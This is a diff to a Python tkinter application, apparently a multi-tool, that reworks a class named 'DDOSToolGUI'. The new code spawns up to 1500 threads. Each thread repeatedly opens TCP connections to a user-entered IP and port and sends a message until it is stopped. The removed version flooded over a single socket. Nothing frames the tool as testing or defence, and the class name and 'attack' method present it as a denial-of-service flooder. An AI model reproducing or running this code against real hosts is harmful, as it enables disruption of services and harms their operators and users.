@@ -372,6 +372,7 @@ class WebContentSearchAppGUI(tk.Frame):
 
 
 class MSSPDecryptorGUI(tk.Frame):
+    # MSSP Decryptor
     def __init__(self, master=None):
         # Initialize the parent class
         super().__init__(master)
@@ -484,119 +485,145 @@ class MSSPDecryptorGUI(tk.Frame):
 
 
 class DDOSToolGUI(tk.Frame):
-    # Define the IPAddressPortEntry class that inherits from tk.Frame
-    class IPAddressPortEntry(tk.Frame):
-        # Initialize the class
-        def __init__(self, master=None):
-            super().__init__(master)  # Call the constructor of the parent class
-            self.master = master  # Store the master (parent) window reference
-            self.create_widgets()  # Call the create_widgets method to create the UI elements
 
-        # Method to create widgets
+    class myThread(threading.Thread):
+        # Nested class for threading
+        def __init__(self, threadID, name, ip, port, msg, stop_event, text_widget):
+            threading.Thread.__init__(self)
+            self.threadID = threadID
+            self.name = name
+            self.ip = ip
+            self.port = port
+            self.msg = msg
+            self.stop_event = stop_event
+            self.text_widget = text_widget  # Text widget for displaying updates
+
+        # Run method for threading
+        def run(self):
+            self.update_text(f"Starting {self.name}")
+            self.attack(self.ip, self.port, self.msg, self.threadID)
+            self.update_text(f"Exiting {self.name}")
+
+        # Function for handling socket connection and communication
+        def attack(self, ip, port, msg, thread_id):
+            while not self.stop_event.is_set():
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                server_address = (ip, port)
+                sock.connect(server_address)
+                try:
+                    threadmsg = f'Thread-{thread_id}: {msg}'
+                    message = threadmsg.encode()
+                    sock.sendall(message)
+                    amount_received = 0
+                    amount_expected = len(message)
+
+                    while amount_received < amount_expected:
+                        data = sock.recv(16)
+                        amount_received += len(data)
+                finally:
+                    sock.close()
+
+        # Update the text widget with messages
+        def update_text(self, message):
+            self.text_widget.config(state=tk.NORMAL)
+            self.text_widget.insert(tk.END, f"{message}\n")
+            self.text_widget.config(state=tk.DISABLED)
+
+    # Nested class for IP Address and Port Entry
+    class IPAddressPortEntry(tk.Frame):
+        def __init__(self, master=None):
+            super().__init__(master)
+            self.master = master
+            self.create_widgets()
+
+        # Create the entry widgets
         def create_widgets(self):
-            # Create the first octet entry and place it in the grid
             self.octet1 = ttk.Entry(self, width=3)
             self.octet1.grid(row=0, column=0)
-            # Create the second octet entry and place it in the grid
             self.octet2 = ttk.Entry(self, width=3)
             self.octet2.grid(row=0, column=2)
-            # Create the third octet entry and place it in the grid
             self.octet3 = ttk.Entry(self, width=3)
             self.octet3.grid(row=0, column=4)
-            # Create the fourth octet entry and place it in the grid
             self.octet4 = ttk.Entry(self, width=3)
             self.octet4.grid(row=0, column=6)
-            # Create dots as labels to visually separate the octets and place them in the grid
+
             self.dot1 = ttk.Label(self, text=".")
             self.dot1.grid(row=0, column=1)
             self.dot2 = ttk.Label(self, text=".")
             self.dot2.grid(row=0, column=3)
             self.dot3 = ttk.Label(self, text=".")
             self.dot3.grid(row=0, column=5)
-            # Create colon as a label to visually separate IP and port and place it in the grid
+
             self.colon = ttk.Label(self, text=":")
             self.colon.grid(row=0, column=7)
-            # Create the port entry and place it in the grid
+
             self.port = ttk.Entry(self, width=5)
             self.port.grid(row=0, column=8)
 
-        # Method to get the IP address and port
+        # Function to get the IP and Port from the entry widgets
         def get(self):
-            # Retrieve the content of each octet entry and port entry
             oct1 = self.octet1.get()
             oct2 = self.octet2.get()
             oct3 = self.octet3.get()
             oct4 = self.octet4.get()
             port = self.port.get()
-            # Construct the IP address string
             ip_address = f"{oct1}.{oct2}.{oct3}.{oct4}"
-            # Return the IP address and port as a tuple
             return ip_address, port
 
+    # Initialization function for the main class
     def __init__(self, master=None):
         super().__init__(master)
-        self.stop_button = None
-        self.start_button = None
-        self.button_frame = None
-        self.thread_label = None
-        self.thread_spinbox = None
-        self.ip_label = None
-        self.ip_entry = None
         self.master = master
-        self.thread_count = 1
-        self.threads = []
-        self.keep_alive = False
         self.pack()
         self.create_widgets()
+        self.stop_event = threading.Event()
 
+    # Create the widgets for the main window
     def create_widgets(self):
-        # IP Address Entry
-        self.ip_label = ttk.Label(self, text="Enter IP address:")
-        self.ip_label.grid(row=0, column=0, padx=5, pady=5)
-        self.ip_entry = self.IPAddressPortEntry(self)
-        self.ip_entry.grid(row=0, column=1, padx=5, pady=5)
-        # Number of Threads Entry
+        self.ip_port_label = tk.Label(self, text="Enter IP address and port in format \'XXX.XXX.XXX.XXX:XX\':")
+        self.ip_port_label.grid(row=0, column=0, columnspan=2, padx=10, pady=5)
+        self.ip_port_entry = self.IPAddressPortEntry(self)
+        self.ip_port_entry.grid(row=1, column=0, columnspan=2, padx=10, pady=5)
+
+        self.msg_label = tk.Label(self, text="Enter Message:")
+        self.msg_label.grid(row=2, column=0, padx=10, pady=5)
+        self.msg_entry = tk.Entry(self)
+        self.msg_entry.grid(row=2, column=1, padx=10, pady=5)
+
         self.thread_label = ttk.Label(self, text="Number of Threads (1 to 1500):")
-        self.thread_label.grid(row=2, column=0, padx=5, pady=5)
+        self.thread_label.grid(row=3, column=0, padx=5, pady=5)
         self.thread_spinbox = ttk.Spinbox(self, from_=1, to=1500, increment=1, width=20)
-        self.thread_spinbox.grid(row=2, column=1, padx=5, pady=5)
-        # Start and Stop Buttons
-        self.button_frame = ttk.Frame(self)
-        self.button_frame.grid(row=3, columnspan=2)
-        self.start_button = ttk.Button(self.button_frame, text="Start", command=self.start_operation)
-        self.start_button.pack(side=tk.LEFT, padx=5, pady=10)
-        self.stop_button = ttk.Button(self.button_frame, text="Stop", command=self.stop_operation)
-        self.stop_button.pack(side=tk.LEFT, padx=5, pady=10)
+        self.thread_spinbox.grid(row=3, column=1, padx=5, pady=5)
 
-    def attack(self, address, port, message, num_thread):
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        addr_port = (address, int(port))
-        sock.connect(addr_port)
-        while self.keep_alive:
-            message = str.encode(message)
-            sock.sendall(message)
-            print(f"Sending {message} to {address}:{port}, thread {num_thread}")
-        sock.close()
-        print(f"Stopped sending {message} to {address}:{port}, thread {num_thread}")
+        self.start_button = tk.Button(self, text="Start", command=self.start_threads)
+        self.start_button.grid(row=4, column=0, padx=10, pady=5)
 
-    def start_operation(self):
-        ip_address, port = self.ip_entry.get()
+        self.stop_button = tk.Button(self, text="Stop", command=self.stop_threads)
+        self.stop_button.grid(row=4, column=1, padx=10, pady=5)
+
+        self.text_box = scrolledtext.ScrolledText(self, wrap=tk.WORD, width=40, height=10)
+        self.text_box.grid(row=5, column=0, columnspan=2, padx=10, pady=5)
+        self.text_box.config(state=tk.DISABLED)
+
+    # Function to start the threads
+    def start_threads(self):
+        self.stop_event.clear()
+        ip, port = self.ip_port_entry.get()
+        port = int(port)
+        msg = self.msg_entry.get()
         num_threads = int(self.thread_spinbox.get())
-        print(f"Starting operation with IP: {ip_address}, Port: {port}, Number of Threads: {num_threads}")
-        msg = "hi"
-        for i in range(num_threads):
-            new_th = threading.Thread(target=self.attack, args=(ip_address, port, msg, i + 1))
-            self.threads.append(new_th)
-        self.keep_alive = True
-        for th in self.threads:
-            th.start()
 
-    def stop_operation(self):
-        print("Stopping operation")
-        self.keep_alive = False
-        for th in self.threads:
-            th.join()
-        print("Stopped")
+        self.threads = []
+        for i in range(num_threads):
+            thread = self.myThread(i + 1, f"Thread-{i + 1}", ip, port, msg, self.stop_event, self.text_box)
+            thread.start()
+            self.threads.append(thread)
+
+    # Function to stop the threads
+    def stop_threads(self):
+        self.stop_event.set()
+        for t in self.threads:
+            t.join()
 
 
 class MainWindow(tk.Tk):
